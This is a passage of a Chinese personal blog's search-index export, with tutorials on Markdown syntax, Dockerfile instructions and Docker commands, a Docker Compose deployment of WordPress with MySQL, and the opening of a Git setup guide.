qmAnqmAnqmAnqmAnqmAnqmAnqmAnqmAnqmAnqmAnqmAnqmAnqmAnqoPdvnY8jcUXPPnu+4x87zsfi2/Zek/L2pdLW6PeUe3kbeJR7Y/3/LfV69m+xDnNC6EtAKDwgqlv9yIHgE/Vwp5G7TW+KRxfaOV75lu7i9FY2NOAEGRMDMAnZXirgPrga/HYOFlXvBYDMNaWY/P01m8v7FGvQLeKg2JaIa6140AdNXCxHC/sgxiNQdy4cWN3nnVFz8aiR1v/3MPum/Z9clA0IQib3+vXr19wjgPoPbwmynrb+0/ybGCb3MXPuYRt5ycZHWinvHDtmL/juRGgHmmdnC/IOECGJo5P0oqCrQTRQh1V7nQViNDMaKN3ctxrKeM753AuuwnAer4DI2yvs7w166B95l7lXK5bEbAx4x/qg903rfEozgOu3sb5fHIu1wBAkJbFwRBqBO+gKeu2jV7vAMY1ZF60CWw6SyOFoPpgWxZheH0EtXr16u7TjpO9jPOEze92MKzTe3jMQcQ4B+M74nzLvH6etAlsO2oHVB/sPnG95wAHSNQnLOUxzBjtYETYiLZwb3cjHMMoo12ej3GcMs/jM97339QmsPWO1ismweY4UAwPdNBrBBHrjLBbGKPa4KwxLgubkMH31kH4zblzBTt6xrQmdAFQRrYy03paLkw6zjl6bx/s2I6+QeU3MdnyadrdN5j/ljbx7MWor7N0zsWp9UzDAd74X9RmwS4tTgU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7UQU7USNh86bXpNfaePsLG/WKXHwzzFf1fDVvnHxtL9Y1KlvOPL16N0m9sOPLoqPgCM+XOhkc4Xp9BBFhx/pbY/CE7at9Diry2va1v5WgkZ4tHDvZinI6DbyYVYHr9HSB8BmBTgLV59kCj2XYSoLewRbONAbQdevWdZ90FAB8BzjHqYtywSvvweckjfJsDbXnrAQtaYFsB0fAfBeIx/gePTWe22fMljYhAGa9mjF8RcOm8XRG4Z28j06sjGrjMtcIi2MepzwOjscV92tnwSgJGlvxsAUEFKe7EIWqBBjP4xyupyweB4iZdYjtLKqeb6znuAPhtdE4xvlCNvvDioUt2LYDbXkcFCx2XIhAER6JA2LOJhdfzsf47vF4b+/DNcqB4NxpZsM8aQjbTgAqejCy03ZQWMKMUDxGXRGS5ZQB1GuFzYBwb+z777/vPk2BZLtchBlQHYDPlaIOtiAwvvdp3GBwrAXfgvAeZM2hDo8Jm+PUw/dXXnllWAdGuddHz4+DthLUwaaxeA2dGiV3FHibsAXFtcATCN85JijkMX/zKcx2ADkmxHhen6042ItVC4AOA5PPlex5s9aSYJeWpoKdpsHgf83DN3eKVa1EAAAAAElFTkSuQmCC" /></p>
<h2 id="段落格式">段落格式</h2>
<h3 id="字体">字体</h3>
<p>在文字两端加上*或_可以实现斜体、粗体和粗斜体：</p>
<pre><code>*斜体*  
_斜体_  
**粗体**  
__粗体__  
***粗斜体***  
___粗斜体___</code></pre>
<p>显示效果如下所示：</p>
<p><em>斜体</em><br />
<em>斜体</em><br />
<strong>粗体</strong><br />
<strong>粗体</strong><br />
<strong><em>粗斜体</em></strong><br />
<strong><em>粗斜体</em></strong></p>
<h3 id="删除线">删除线</h3>
<p>在文字两端加上2个~符号：</p>
<pre><code>hujinbo.me  
~~hujinbo.com~~</code></pre>
<p>显示效果如下所示：</p>
<p>hujinbo.me<br />
<del>hujinbo.com</del></p>
<h3 id="分隔线">分隔线</h3>
<p>使用3个以上的*或_号（需独占一行）：</p>
<pre><code>***

分隔线

---</code></pre>
<p>显示效果如下所示：</p>
<hr />
<p>分隔线</p>
<hr />
<h3 id="换行">换行</h3>
<p>使用2个空格加回车：</p>
<pre><code>hujinbo.me  
www.hujinbo.me</code></pre>
<p>显示效果如下所示：</p>
<p>hujinbo.me<br />
www.hujinbo.me</p>
<h2 id="列表格式">列表格式</h2>
<h3 id="无序列表">无序列表</h3>
<p>使用*、+或-号作为列表标记：</p>
<pre><code>* 第一项
+ 第二项
- 第三项</code></pre>
<p>显示效果如下所示：</p>
<ul>
<li>第一项</li>
<li>第二项</li>
<li>第三项</li>
</ul>
<h3 id="有序列表">有序列表</h3>
<p>使用数字和. 来表示：</p>
<pre><code>1. 第一项
2. 第二项
3. 第三项</code></pre>
<p>显示效果如下所示：</p>
<ol type="1">
<li>第一项<br />
</li>
<li>第二项</li>
<li>第三项</li>
</ol>
<h3 id="列表嵌套">列表嵌套</h3>
<p>在子选项前加4个空格：</p>
<pre><code>1. 第一项：
    - 特点1
    - 特点2
2. 第二项：
    - 特点1
    - 特点2</code></pre>
<p>显示效果如下所示：</p>
<ol type="1">
<li>第一项：
<ul>
<li>特点1</li>
<li>特点2</li>
</ul></li>
<li>第二项：
<ul>
<li>特点1</li>
<li>特点2</li>
</ul></li>
</ol>
<h2 id="引用格式">引用格式</h2>
<p>在段落的开头使用&gt;符号，并跟一个空格：</p>
<pre><code>&gt; 引用描述</code></pre>
<p>显示效果如下所示：</p>
<blockquote>
<p>引用描述</p>
</blockquote>
<h2 id="链接格式">链接格式</h2>
<p>语法：[链接名称](链接地址 "可选标题") 或 <链接地址></p>
<pre><code>[我的博客](https://www.hujinbo.me &quot;我的个人博客&quot;)</code></pre>
<p>显示效果如下所示：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuaHVqaW5iby5tZQ==">我的博客<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="图片格式">图片格式</h2>
<p>语法：![替代文字](图片地址 "可选标题")<br />
注意：若图片作为一个独自的段落存在，则替代文字会被当做标题处理，故在末尾加上<code>\</code></p>
<pre><code>![cc-by-nc-sa](/images/cc-by-nc-sa.svg &quot;许可协议&quot;)\</code></pre>
<p>显示效果如下所示：</p>
<p><img data-src="/images/cc-by-nc-sa.svg" title="许可协议" alt="cc-by-nc-sa" /><br />
</p>
<h2 id="代码格式">代码格式</h2>
<h3 id="代码片段">代码片段</h3>
<p>使用反引号包裹函数名或者代码片段：</p>
<pre><code>`toUpperCase()`  
``select `a`, `b` from table``</code></pre>
<p>显示效果如下所示：</p>
<p><code>toUpperCase()</code><br />
<code>select `a`, `b` from table</code></p>
<h3 id="代码区块">代码区块</h3>
<p>用4个空格或用```包裹代码，并在后面指定编程语言和标题：</p>
<pre><code>注：示例代码中`` `含有空格（防止被Hexo解析成代码），实际使用时请去除空格。

`` `java HelloWorld.java
public class HelloWorld &#123;
    public static void main(String []args) &#123;
       System.out.println(&quot;Hello World!&quot;);
    &#125;
&#125;
`` `</code></pre>
<p>显示效果如下所示：</p>
<figure class="highlight java"><figcaption><span>HelloWorld.java</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String []args)</span> </span>&#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="表格格式">表格格式</h2>
<p>使用 | 来分隔不同的单元格，使用 - 来分隔表头，使用 : 来控制对齐方式：</p>
<pre><code>| 编号 | 左对齐 | 居中对齐 | 右对齐 |
| --- | :--- | :---: | ---: |
| 0 | 单元格1 | 单元格2 | 单元格3 |
| 1 | 单元格4 | 单元格5 | 单元格6 |</code></pre>
<p>显示效果如下所示：</p>
<table>
<thead>
<tr class="header">
<th>编号</th>
<th style="text-align: left;">左对齐</th>
<th style="text-align: center;">居中对齐</th>
<th style="text-align: right;">右对齐</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>0</td>
<td style="text-align: left;">单元格1</td>
<td style="text-align: center;">单元格2</td>
<td style="text-align: right;">单元格3</td>
</tr>
<tr class="even">
<td>1</td>
<td style="text-align: left;">单元格4</td>
<td style="text-align: center;">单元格5</td>
<td style="text-align: right;">单元格6</td>
</tr>
</tbody>
</table>
<h2 id="任务列表">任务列表</h2>
<p>使用 - [ ] 可以显示任务列表，[x] 代表勾选状态：</p>
<pre><code>- [ ] 任务1
- [x] 任务2
- [ ] 任务3</code></pre>
<p>显示效果如下所示：</p>
<ul class="task-list">
<li><input type="checkbox" disabled="" />
任务1</li>
<li><input type="checkbox" disabled="" checked="" />
任务2</li>
<li><input type="checkbox" disabled="" />
任务3</li>
</ul>
<h2 id="高级格式">高级格式</h2>
<h3 id="转义字符">转义字符</h3>
<p>当需要显示Markdown使用的关键字符时，可以使用反斜杠进行转义：</p>
<pre><code>\*\*我的内容\*\*</code></pre>
<p>显示效果如下所示：</p>
<p>**我的内容**</p>
<h3 id="html标签">HTML标签</h3>
<p>markdown不支持的标签，可以直接使用HTML编写，如：</p>
<pre><code>使用 &lt;kbd&gt;Ctrl&lt;/kbd&gt; + &lt;kbd&gt;C&lt;/kbd&gt; 复制文本</code></pre>
<p>显示效果如下所示：</p>
<p>使用 <kbd>Ctrl</kbd> + <kbd>C</kbd> 复制文本</p>
]]></content>
      <categories>
        <category>博客教程</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker快速入门</title>
    <url>/posts/2763/</url>
    <content><![CDATA[<blockquote>
<p>Docker是一个用于开发，交付和运行应用程序的开放平台。Docker能够将应用程序与基础架构分开，从而可以快速交付软件。</p>
</blockquote>
<p>通过利用Docker的方法来快速交付、测试和部署代码，可以大大减少编写代码和在生产环境中运行代码之间的延迟。</p>
<h2 id="dokcer-架构">Dokcer 架构</h2>
<p><img data-src="https://img.hujinbo.me/blog/20191108233548.png" /> <span id="more"></span></p>
<h2 id="dockerfile语法">Dockerfile语法</h2>
<h3 id="from">FROM</h3>
<p>尽量使用官方的image作为base image</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FROM centos</span><br></pre></td></tr></table></figure>
<h3 id="label">LABEL</h3>
<p>设置维护者、版本号、描述等信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LABEL maintainer=&#x27;hujinbo1995@126.com&#x27;</span><br><span class="line">LABEL version=&quot;1.0&quot;</span><br><span class="line">LABEL description=&quot;This text illustrates \</span><br><span class="line">that label-values can span multiple lines.&quot;</span><br></pre></td></tr></table></figure>
<h3 id="env">ENV</h3>
<p>设置环境变量，尽量使用<code>ENV</code>增加可维护性</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ENV MYSQL_VERSION 5.7</span><br><span class="line">RUN apt-get install -y mysql-server=&quot;$&#123;MYSQL_VERSION&#125;&quot;</span><br></pre></td></tr></table></figure>
<h3 id="workdir">WORKDIR</h3>
<p>设置 <code>RUN</code>、<code>CMD</code>、<code>ENTRYPOINT</code>、<code>COPY</code>、<code>ADD</code> 的工作目录，不要使用<code>RUN cd</code>，使用时尽量使用绝对目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WORKDIR /test # 目录不存在会自动创建</span><br></pre></td></tr></table></figure>
<h3 id="copy">COPY</h3>
<p>复制指定的文件或目录到容器中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">COPY test relativeDir/   # 添加&quot;test&quot;到`WORKDIR`/relativeDir/</span><br></pre></td></tr></table></figure>
<h3 id="add">ADD</h3>
<p>除了具备<code>COPY</code>的功能外，还可以解压缩，正常情况下优先使用<code>copy</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADD test.tar.gz / # 添加到根目录并解压</span><br></pre></td></tr></table></figure>
<h3 id="run">RUN</h3>
<p>每执行一次<code>RUN</code>命令会创建新的Image Layer，为避免无用分层，可将多条命令合并成一条，使用反斜线换行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RUN apt-get update &amp;&amp; apt-get install -y \</span><br><span class="line">    package-bar \</span><br><span class="line">    package-baz \</span><br><span class="line">    package-foo</span><br></pre></td></tr></table></figure>
<h3 id="cmd">CMD</h3>
<p>指定启动容器时执行的命令，如果定义了多个<code>CMD</code>，只有最后一条会执行；如果<code>docker run</code>指定了运行的命令，<code>CMD</code>命令会被忽略</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FROM centos</span><br><span class="line">ENV name Docker</span><br><span class="line">CMD [&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;echo Hello $&#123;name&#125;&quot;]</span><br></pre></td></tr></table></figure>
<h3 id="entrypoint">ENTRYPOINT</h3>
<p>设置容器启动时运行的命令，不会被<code>docker run</code>覆盖，一定会执行，一般用于运行shell脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">COPY docker-entrypoint.sh /usr/local/bin/</span><br><span class="line">RUN ln -s usr/local/bin/docker-entrypoint.sh /entrypoint.sh # backwards compat</span><br><span class="line">ENTRYPOINT [&quot;docker-entrypoint.sh&quot;]</span><br><span class="line"></span><br><span class="line">EXPOSE 3306 33060</span><br><span class="line">CMD [&quot;mysqld&quot;]</span><br></pre></td></tr></table></figure>
<h3 id="expose">EXPOSE</h3>
<p>通知Docker容器在运行时监听指定的端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXPOSE 8080</span><br></pre></td></tr></table></figure>
<h3 id="volume">VOLUME</h3>
<p>指定挂载点（容器里的路径），会将此路径映射到本地的硬盘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VOLUME /var/lib/mysql</span><br><span class="line"># 可以使用如下方式别名</span><br><span class="line">docker run -v mysql:/var/lib/mysql</span><br></pre></td></tr></table></figure>
<h3 id="user">USER</h3>
<p>指定运行容器时的用户名或UID，后续的<code>RUN</code>也会使用指定用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USER daemon</span><br></pre></td></tr></table></figure>
<h3 id="onbuild">ONBUILD</h3>
<p>用于延迟构建命令的执行，<code>ONBUILD</code> 指定的命令会在使用它的镜像执行构建时候执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ONBUILD [INSTRUCTION]</span><br></pre></td></tr></table></figure>
<h3 id="实践">实践</h3>
<p>通过<code>ENTRYPOINT</code>和<code>CMD</code>，实现简单的压力测试工具。</p>
<figure class="highlight bash"><figcaption><span>Dockerfile</span></figcaption><table><tr><td class="code"><pre><span class="line">FROM ubuntu</span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install -y stress</span><br><span class="line">ENTRYPOINT [<span class="string">&quot;usr/bin/stress&quot;</span>]</span><br><span class="line">CMD []</span><br></pre></td></tr></table></figure>
<div class="note warning">
            <p>更多内容，请阅读<strong><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL3JlZmVyZW5jZS9idWlsZGVyLw==">官方文档<i class="fa fa-external-link-alt"></i></span></strong></p>
          </div>
<h2 id="docker常用命令">Docker常用命令</h2>
<h3 id="构建镜像">构建镜像</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -t hujinbo/stress .</span><br></pre></td></tr></table></figure>
<h3 id="发布镜像">发布镜像</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 登录Docker Hub，输入用户名和密码</span></span><br><span class="line">docker login</span><br><span class="line"></span><br><span class="line"><span class="comment"># 推送镜像</span></span><br><span class="line">docker push hujinbo/stress</span><br></pre></td></tr></table></figure>
<h3 id="拉取镜像">拉取镜像</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull hello-world</span><br></pre></td></tr></table></figure>
<h3 id="查看镜像">查看镜像</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker image ls</span><br><span class="line">docker images</span><br></pre></td></tr></table></figure>
<h3 id="查看分层">查看分层</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">history</span> df3906dca9e7</span><br></pre></td></tr></table></figure>
<h3 id="运行容器">运行容器</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 普通启动</span></span><br><span class="line">docker run hello-world</span><br><span class="line"></span><br><span class="line"><span class="comment"># -d      : 设置容器在后台运行</span></span><br><span class="line"><span class="comment"># --name  : 设置容器名称，和ID一样具备唯一性，可用名称进行操作</span></span><br><span class="line"><span class="comment"># -p      : 设置端口映射，将本地的8888映射到容器的80端口</span></span><br><span class="line">docker run -d --name web -p 8888:80 nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以交互模式运行</span></span><br><span class="line">docker run -it nginx /bin/sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 限制容器内存大小为200M</span></span><br><span class="line">docker run --memory=200M hujinbo/stress --vm 1 --verbose --vm-bytes 198M</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定CPU相对权重，如下分别为10和5，当2个容器占满cpu时，前者是后者的两倍</span></span><br><span class="line">docker run --cpu-shares=10 --name test1 hujinbo/stress --cpu 1</span><br><span class="line">docker run --cpu-shares=5 --name test2 hujinbo/stress --cpu 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更多用法，请参考官方文档：https://docs.docker.com/engine/reference/run/</span></span><br></pre></td></tr></table></figure>
<h3 id="查看容器">查看容器</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看正在运行的容器</span></span><br><span class="line">docker container ls</span><br><span class="line">docker ps</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有容器，包括已经退出的</span></span><br><span class="line">docker container ls -a</span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
<h3 id="查看日志">查看日志</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker logs df3906dca9e7</span><br></pre></td></tr></table></figure>
<h3 id="查看详细信息">查看详细信息</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker inspect df3906dca9e7</span><br></pre></td></tr></table></figure>
<h3 id="进入容器">进入容器</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it df3906dca9e7 /bin/bash</span><br></pre></td></tr></table></figure>
<h3 id="停止容器">停止容器</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop df3906dca9e7</span><br></pre></td></tr></table></figure>
<h3 id="启动容器">启动容器</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker start df3906dca9e7</span><br></pre></td></tr></table></figure>
<h3 id="删除容器">删除容器</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除指定容器</span></span><br><span class="line">docker container rm df3906dca9e7</span><br><span class="line">docker rm df3906dca9e7</span><br><span class="line"></span><br><span class="line"><span class="comment"># 批量删除所有的容器</span></span><br><span class="line">docker rm $(docker ps -aq)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 批量删除状态为退出的容器</span></span><br><span class="line">docker rm $(docker ps -f <span class="string">&quot;status=exited&quot;</span> -q)</span><br></pre></td></tr></table></figure>
<h3 id="删除镜像">删除镜像</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker image rm fce289e99eb9</span><br><span class="line">docker rmi fce289e99eb9</span><br></pre></td></tr></table></figure>
<h3 id="导出镜像">导出镜像</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker save -o mysql.tar mysql:5.7</span><br></pre></td></tr></table></figure>
<h3 id="导入镜像">导入镜像</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker load -i mysql.tar</span><br></pre></td></tr></table></figure>
<h2 id="dokcer网络配置">Dokcer网络配置</h2>
<p><img data-src="https://img.hujinbo.me/blog/20191109191845.png" /></p>
<ol type="1">
<li><p>通过link，实现容器单向互通。如下test2可访问test1，但test1不可访问test2。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d --name test1 -e MYSQL_ALLOW_EMPTY_PASSWORD=<span class="literal">true</span> mysql:5.7</span><br><span class="line">docker run -d --name test2 --link test1 -p 80:80 nginx</span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> -it test2 /bin/sh</span><br><span class="line">apt-get update &amp;&amp; apt install -y iputils-ping</span><br><span class="line">ping test1</span><br></pre></td></tr></table></figure></p></li>
<li><p>通过自定义bridge，实现容器双向互通（推荐）。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 新建网络</span></span><br><span class="line">docker network create -d bridge my-net</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看网络</span></span><br><span class="line">docker network ls</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接容器</span></span><br><span class="line">docker run -d --name test1 --network my-net -e MYSQL_ALLOW_EMPTY_PASSWORD=<span class="literal">true</span> mysql:5.7</span><br><span class="line">docker run -d --name test2 --network my-net -p 80:80 nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看指定网络的详细信息</span></span><br><span class="line">docker network inspect my-net</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改network，既连接默认，也连接新的</span></span><br><span class="line">docker network connect my-net test3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除网络</span></span><br><span class="line">docker network rm my-net</span><br></pre></td></tr></table></figure></p></li>
</ol>
<h2 id="docker数据管理">Docker数据管理</h2>
<ol type="1">
<li><p>定义<code>VOLUME</code>，由docker后台自动创建 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动时挂载数据卷，-v 别名</span></span><br><span class="line">docker run -d -v mysql-data:/var/lib/mysql -e MYSQL_ALLOW_EMPTY_PASSWORD=<span class="literal">true</span> mysql:5.7</span><br><span class="line"><span class="comment"># 查看数据卷</span></span><br><span class="line">docker volume ls</span><br><span class="line"><span class="comment"># 查看挂载详细信息</span></span><br><span class="line">docker volume inspect mysql-data</span><br><span class="line"><span class="comment"># 删除数据卷</span></span><br><span class="line">docker volume rm mysql-data</span><br></pre></td></tr></table></figure></p></li>
<li><p>挂载主机目录，不需要定义<code>VOLUME</code>，只需指定本地目录与容器目录的对应关系 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -v /home/data/mysql:/var/lib/mysql -e MYSQL_ALLOW_EMPTY_PASSWORD=<span class="literal">true</span> mysql:5.7</span><br></pre></td></tr></table></figure></p></li>
</ol>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker Compose多容器部署</title>
    <url>/posts/53410/</url>
    <content><![CDATA[<blockquote>
<p>Docker Compose是用于定义和运行多容器Docker应用程序的工具，可以通过YAML文件创建、管理多个容器。</p>
</blockquote>
<h2 id="安装">安装</h2>
<ol type="1">
<li><p>下载Docker Compose可执行文件 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo curl -L <span class="string">&quot;https://github.com/docker/compose/releases/download/1.24.1/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/<span class="built_in">local</span>/bin/docker-compose</span><br></pre></td></tr></table></figure></p></li>
<li><p>修改可执行权限 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br></pre></td></tr></table></figure></p></li>
</ol>
<span id="more"></span>
<h2 id="语法介绍">语法介绍</h2>
<p>一个Services代表一个container，可以从image创建，也可以通过build创建，可以指定volume和network。如下通过docker部署wordpress应用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建数据卷</span></span><br><span class="line">docker volume create mysql-data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建网络</span></span><br><span class="line">docker network create -d bridge my-net</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行容器</span></span><br><span class="line">docker run -d --name wordpress --network my-net -p 8080:80 -e WORDPRESS_DB_HOST=mysql -e WORDPRESS_DB_PASSWORD=root wordpress</span><br><span class="line">docker run -d --name mysql --network my-net -v mysql-data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=root -e MYSQL_DATABASE=wordpress mysql:5.7</span><br></pre></td></tr></table></figure>
<p>通过Docker Compose部署则只需编写如下文件，执行<code>docker-compose up</code>命令即可：</p>
<figure class="highlight bash"><figcaption><span>docker-compose.yml</span></figcaption><table><tr><td class="code"><pre><span class="line">version: <span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  wordpress:</span><br><span class="line">    image: wordpress</span><br><span class="line">    ports:</span><br><span class="line">      - 8080:80</span><br><span class="line">    environment:</span><br><span class="line">      WORDPRESS_DB_HOST: mysql</span><br><span class="line">      WORDPRESS_DB_PASSWORD: root</span><br><span class="line">    networks:</span><br><span class="line">      - my-net</span><br><span class="line"></span><br><span class="line">  mysql:</span><br><span class="line">    image: mysql:5.7</span><br><span class="line">    environment:</span><br><span class="line">      MYSQL_ROOT_PASSWORD: root</span><br><span class="line">      MYSQL_DATABASE: wordpress</span><br><span class="line">    volumes:</span><br><span class="line">      - mysql-data:/var/lib/mysql</span><br><span class="line">    networks:</span><br><span class="line">      - my-net</span><br><span class="line"></span><br><span class="line">volumes:</span><br><span class="line">  mysql-data:</span><br><span class="line"></span><br><span class="line">networks:</span><br><span class="line">  my-net:</span><br><span class="line">    driver: bridge</span><br></pre></td></tr></table></figure>
<h2 id="常用命令">常用命令</h2>
<h3 id="查看版本">查看版本</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose -v</span><br></pre></td></tr></table></figure>
<h3 id="构建容器">构建容器</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br></pre></td></tr></table></figure>
<h3 id="启动服务">启动服务</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 默认使用当前目录下的docker-compose.yml</span></span><br><span class="line">docker-compose up</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在后台运行，不打印日志</span></span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据指定文件启动</span></span><br><span class="line">docker-compose -f docker-compose.yml up</span><br></pre></td></tr></table></figure>
<h3 id="查看镜像">查看镜像</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose images</span><br></pre></td></tr></table></figure>
<h3 id="查看容器">查看容器</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose ps</span><br></pre></td></tr></table></figure>
<h3 id="进入容器">进入容器</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose <span class="built_in">exec</span> mysql bash</span><br></pre></td></tr></table></figure>
<h3 id="停止服务">停止服务</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 停止但不删除容器</span></span><br><span class="line">docker-compose stop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止容器并移除网络</span></span><br><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>
<h3 id="水平扩展">水平扩展</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指定服务运行的容器个数，格式：service=num</span></span><br><span class="line">docker-compose up -d --scale wordpress=3</span><br></pre></td></tr></table></figure>
<div class="note warning">
            <p>更多内容，请阅读<strong><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vY29tcG9zZS8=">官方文档<i class="fa fa-external-link-alt"></i></span></strong></p>
          </div>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Git快速入门</title>
    <url>/posts/3267/</url>
    <content><![CDATA[<blockquote>
<p>Git是一个开源的分布式版本控制系统，用于高效快速地处理任何小型或大型的项目。</p>
</blockquote>
<h2 id="环境安装">环境安装</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y git</span><br></pre></td></tr></table></figure>
<h2 id="初始化配置">初始化配置</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建SSH key</span></span><br><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;hujinbo1995@126.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换目录</span></span><br><span class="line"><span class="built_in">cd</span> ~/.ssh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看公钥，复制到github</span></span><br><span class="line">cat id_rsa.pub</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试连通性</span></span><br><span class="line">ssh -T git@github.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置用户信息</span></span><br><span class="line">git config --global user.name <span class="string">&quot;hujinbo&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;hujinbo1995@126.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看配置列表</span></span><br><span class="line">git config --list</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h2 id="常用命令">常用命令</h2>
